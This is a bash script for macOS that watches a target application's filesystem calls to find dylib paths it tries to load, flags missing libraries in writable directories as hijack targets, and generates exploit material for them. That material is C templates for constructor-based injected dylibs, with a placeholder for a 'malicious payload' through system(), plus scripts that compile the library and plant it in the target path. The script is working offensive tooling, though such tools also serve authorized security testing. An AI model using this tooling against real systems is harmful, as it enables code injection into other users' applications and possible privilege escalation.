#!/bin/bash
#
# dlopen Hijacking Script
#
# This script helps identify and exploit dlopen hijacking opportunities
# by monitoring the file system calls made by an application when using dlopen.
#
# Usage: ./dlopen_hijack.sh <path_to_application> [args]
#

# Color definitions
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] This script must be run as root to monitor filesystem calls${NC}"
    echo -e "    Try: sudo $0 $*"
    exit 1
fi

# Check if application path is provided
if [ $# -lt 1 ]; then
    echo -e "${RED}Usage: $0 <path_to_application> [args]${NC}"
    exit 1
fi

APP_PATH="$1"
shift
APP_ARGS="$@"

# Check if application exists
if [ ! -f "$APP_PATH" ]; then
    echo -e "${RED}[!] Application not found: $APP_PATH${NC}"
    exit 1
fi

echo -e "${BLUE}=================================================${NC}"
echo -e "${BLUE}        dlopen Hijacking Script                  ${NC}"
echo -e "${BLUE}=================================================${NC}"
echo -e "${GREEN}[+] Target application: $APP_PATH${NC}"
if [ ! -z "$APP_ARGS" ]; then
    echo -e "${GREEN}[+] Arguments: $APP_ARGS${NC}"
fi

# Create temporary directory
TMP_DIR=$(mktemp -d)
RESULTS_FILE="${TMP_DIR}/dlopen_results.txt"
FS_USAGE_FILE="${TMP_DIR}/fs_usage.txt"
HIJACK_CANDIDATES="${TMP_DIR}/hijack_candidates.txt"

echo -e "${GREEN}[+] Setting up monitoring environment...${NC}"

# Create named pipe for fs_usage output
FIFO="${TMP_DIR}/fs_usage_pipe"
mkfifo "$FIFO"

# Ask user for a library name pattern to filter (optional)
echo -e "${YELLOW}[!] Enter a library name pattern to filter (e.g., 'lib' or '.dylib'), or leave blank for all:${NC}"
read LIB_PATTERN

if [ -z "$LIB_PATTERN" ]; then
    LIB_PATTERN=".dylib"
    echo -e "${YELLOW}[!] Using default pattern: ${LIB_PATTERN}${NC}"
fi

# Start fs_usage monitoring in background
echo -e "${GREEN}[+] Starting filesystem monitoring...${NC}"
fs_usage -w -f filesystem 2>/dev/null | grep -i "$LIB_PATTERN" > "$FIFO" &
FS_USAGE_PID=$!

# Wait a moment for fs_usage to initialize
sleep 1

# Start a background process to read from the pipe and save to file
cat "$FIFO" > "$FS_USAGE_FILE" &
CAT_PID=$!

# Run the application
echo -e "${GREEN}[+] Launching application: $APP_PATH $APP_ARGS${NC}"
echo -e "${YELLOW}[!] Use the application normally to trigger dlopen calls, then exit.${NC}"
echo -e "${YELLOW}[!] Press Ctrl+C in this terminal when done...${NC}"

# Set trap for SIGINT
trap cleanup INT

# Function to clean up resources
cleanup() {
    echo -e "\n${GREEN}[+] Stopping monitoring...${NC}"
    kill -TERM $FS_USAGE_PID 2>/dev/null
    kill -TERM $CAT_PID 2>/dev/null
    wait $FS_USAGE_PID 2>/dev/null
    wait $CAT_PID 2>/dev/null
    process_results
}

# Function to process the collected data
process_results() {
    echo -e "${GREEN}[+] Processing results...${NC}"
    
    # Extract attempted file opens
    grep -E "open|stat|stat64|access|lstat" "$FS_USAGE_FILE" | grep -i "$LIB_PATTERN" | awk '{print $4}' | sort | uniq > "${TMP_DIR}/accessed_files.txt"
    
    echo "dlopen Hijacking Analysis for $APP_PATH" > "$RESULTS_FILE"
    echo "==============================================" >> "$RESULTS_FILE"
    echo "Date: $(date)" >> "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
    
    # Track which libraries were opened vs just checked
    echo -e "${GREEN}[+] Checking for dlopen hijacking opportunities...${NC}"
    echo "Potential dlopen Hijacking Targets:" >> "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
    
    echo "# Potential dlopen hijacking targets" > "$HIJACK_CANDIDATES"
    echo "# Format: library_path|exists|writable|current_directory_check" >> "$HIJACK_CANDIDATES"
    
    while read -r FILE; do
        # Skip if it's not a full path or filename only
        if [[ "$FILE" != /* && "$FILE" != *".dylib" ]]; then
            continue
        fi
        
        # Get the real path
        REAL_PATH="$FILE"
        
        # Check if this is a relative path (no /)
        if [[ "$FILE" != /* ]]; then
            REAL_PATH="$(pwd)/$FILE"
            CURRENT_DIR_CHECK=true
        else
            CURRENT_DIR_CHECK=false
        fi
        
        # Check if file exists
        if [ -f "$REAL_PATH" ]; then
            FILE_EXISTS=true
        else
            FILE_EXISTS=false
        fi
        
        # Check if directory is writable
        DIR_PATH=$(dirname "$REAL_PATH")
        if [ -w "$DIR_PATH" ]; then
            DIR_WRITABLE=true
        else
            DIR_WRITABLE=false
        fi
        
        # Save to candidates file
        echo "$REAL_PATH|$FILE_EXISTS|$DIR_WRITABLE|$CURRENT_DIR_CHECK" >> "$HIJACK_CANDIDATES"
        
        # Log the file and its status
        if ! $FILE_EXISTS && $DIR_WRITABLE; then
            echo -e "${RED}[!] High-value target: $REAL_PATH${NC}"
            echo -e "${RED}    File doesn't exist but directory is writable!${NC}"
            echo "HIGH-VALUE: $REAL_PATH" >> "$RESULTS_FILE"
            echo "  - File doesn't exist" >> "$RESULTS_FILE"
            echo "  - Directory $(dirname "$REAL_PATH") is writable" >> "$RESULTS_FILE"
            if $CURRENT_DIR_CHECK; then
                echo "  - Checked in current directory" >> "$RESULTS_FILE"
            fi
            echo "" >> "$RESULTS_FILE"
        elif $CURRENT_DIR_CHECK; then
            echo -e "${YELLOW}[!] Current directory check: $REAL_PATH${NC}"
            echo "CURRENT_DIR_CHECK: $REAL_PATH" >> "$RESULTS_FILE"
            echo "  - File $([ -f "$REAL_PATH" ] && echo "exists" || echo "doesn't exist")" >> "$RESULTS_FILE"
            echo "  - Directory $(dirname "$REAL_PATH") is $([ -w "$(dirname "$REAL_PATH")" ] && echo "writable" || echo "not writable")" >> "$RESULTS_FILE"
            echo "" >> "$RESULTS_FILE"
        elif ! $FILE_EXISTS; then
            echo -e "${YELLOW}[!] Missing file: $REAL_PATH${NC}"
            echo "MISSING: $REAL_PATH" >> "$RESULTS_FILE"
            echo "  - Directory $(dirname "$REAL_PATH") is $([ -w "$(dirname "$REAL_PATH")" ] && echo "writable" || echo "not writable")" >> "$RESULTS_FILE"
            echo "" >> "$RESULTS_FILE"
        fi
    done < "${TMP_DIR}/accessed_files.txt"
    
    # Create exploit template for each viable candidate
    mkdir -p "${TMP_DIR}/exploit_templates"
    
    HIGH_VALUE_COUNT=0
    
    while IFS="|" read -r LIB EXISTS WRITABLE CURRENT_DIR; do
        if [[ "$LIB" == "#"* ]]; then continue; fi
        
        if [ "$EXISTS" = "false" ] && [ "$WRITABLE" = "true" ]; then
            HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
            
            LIB_NAME=$(basename "$LIB")
            TEMPLATE_FILE="${TMP_DIR}/exploit_templates/${LIB_NAME}.c"
            
            # Create C template for the exploit
            cat > "$TEMPLATE_FILE" << EOF
/**
 * dlopen Hijacking Exploit for: $LIB_NAME
 * Target Application: $APP_PATH
 * Generated: $(date)
 *
 * Compilation:
 * gcc -dynamiclib -o "$LIB_NAME" "$TEMPLATE_FILE"
 */

#include <stdio.h>
#include <stdlib.h>
#include <syslog.h>
#include <unistd.h>
#include <time.h>

__attribute__((constructor))
static void initialize(int argc, const char **argv) {
    // Log the hijack
    syslog(LOG_ERR, "[+] dlopen hijack successful for $LIB_NAME in %s (PID: %d)", 
           argv[0] ? argv[0] : "unknown", getpid());
    
    // Create a proof file
    FILE *f = fopen("/tmp/dlopen_hijack_proof.txt", "a");
    if (f) {
        fprintf(f, "[%ld] Hijacked $LIB_NAME in %s (PID: %d)\\n", 
                time(NULL), argv[0] ? argv[0] : "unknown", getpid());
        fclose(f);
    }
    
    // You can add your malicious payload here
    // system("command to execute");
}
EOF
            
            # Create shell script for quick exploitation
            SCRIPT_FILE="${TMP_DIR}/exploit_templates/exploit_${LIB_NAME%.dylib}.sh"
            
            cat > "$SCRIPT_FILE" << EOF
#!/bin/bash
# Exploit script for dlopen hijacking of $LIB_NAME
# Target: $APP_PATH

# Compile the dylib
gcc -dynamiclib -o "$LIB_NAME" "${LIB_NAME}.c"

if [ $? -ne 0 ]; then
    echo "Error: Compilation failed!"
    exit 1
fi

# Create target directory if it doesn't exist
mkdir -p "$(dirname "$LIB")"

# Copy the dylib to the target location
cp "$LIB_NAME" "$LIB"

echo "Exploit deployed to $LIB"
echo "Now run: $APP_PATH" 
EOF
            chmod +x "$SCRIPT_FILE"
        fi
    done < "$HIJACK_CANDIDATES"
    
    # Create final report
    REPORT_FILE="dlopen_hijack_report_$(date +%Y%m%d_%H%M%S).txt"
    cp "$RESULTS_FILE" "$REPORT_FILE"
    
    echo -e "${GREEN}[+] Analysis complete!${NC}"
    echo -e "${GREEN}[+] Found $HIGH_VALUE_COUNT high-value hijacking opportunities${NC}"
    echo -e "${GREEN}[+] Results saved to: $REPORT_FILE${NC}"
    
    if [ $HIGH_VALUE_COUNT -gt 0 ]; then
        echo -e "${GREEN}[+] Exploit templates created in: ${TMP_DIR}/exploit_templates/${NC}"
        echo -e "${YELLOW}[!] Would you like to keep the exploit templates? (y/n)${NC}"
        read KEEP_TEMPLATES
        
        if [[ "$KEEP_TEMPLATES" == "y" || "$KEEP_TEMPLATES" == "Y" ]]; then
            TEMPLATES_DIR="./dlopen_exploit_templates_$(date +%Y%m%d_%H%M%S)"
            cp -r "${TMP_DIR}/exploit_templates" "$TEMPLATES_DIR"
            echo -e "${GREEN}[+] Templates copied to: $TEMPLATES_DIR${NC}"
        fi
    fi
    
    # Cleanup temporary files
    rm -rf "$TMP_DIR"
    
    exit 0
}

# Run the application and wait for it to finish
"$APP_PATH" $APP_ARGS

# Clean up when the application exits
cleanup